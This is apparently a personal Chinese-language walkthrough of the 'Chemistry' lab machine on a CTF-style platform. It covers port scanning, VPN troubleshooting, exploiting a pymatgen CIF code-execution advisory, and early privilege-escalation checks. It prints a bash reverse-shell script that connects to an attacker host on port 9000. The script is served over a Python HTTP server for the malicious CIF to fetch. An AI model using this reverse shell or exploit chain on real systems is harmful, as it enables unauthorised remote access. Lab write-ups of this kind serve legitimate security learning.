---
cover: "[[source/image/Chemistry.jpeg]]"
---
启动openvpn之后，我们尝试利用nmap来扫描全部的开放端口，我看这不是开放了四个端口么，但是只有上面两个是开放的

!![[image 20.png]]

woc搞了好久的网络发现了两个问题，一个是当openvpn开启过多时或者时错误的kill openvpn进程时留下的tun网络接口会导致ip地址的连接错误，要删除过多的tun接口，还有就是代理问题，我看了好久的火狐为什么没有显示结果是因为代理的问题，不知道什么原因就变成系统代理了，👿我了

!![[image 21.png]]

尝试注册然后登录

name：123456

pass：123456

然后发现是利用ssti漏洞和CIF的poc来实现shell反弹

CIF POC：[Arbitrary code execution when parsing a maliciously crafted JonesFaithfulTransformation transformation_string](https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f)

!![[image 22.png]]

桌面上写一个shell.sh,并用python，诱导CIF使用这个shell

```python
python3 -m http.server 80


#!/bin/bash
/usr/bin/bash -c "/usr/bin/bash -i >& /dev/tcp/10.10.16.22/9000 0>&1"
```

上传之后点击查看即可反弹shell

发现wsl反弹shell存在问题（解决方法 https://github.com/Microsoft/wsl/issues/11855 ）

成功连接

!![[image 23.png]]

尝试提权，查看suid用户，同时发现可以curl和wget

!![[image 24.png]]

利用 https://github.com/peass-ng/PEASS-ng/releases/tag/20250301-c97fb02a 

发现是CVE-2021-3506

等等发现为sqlite3数据库，尝试查看

!![[image 25.png]]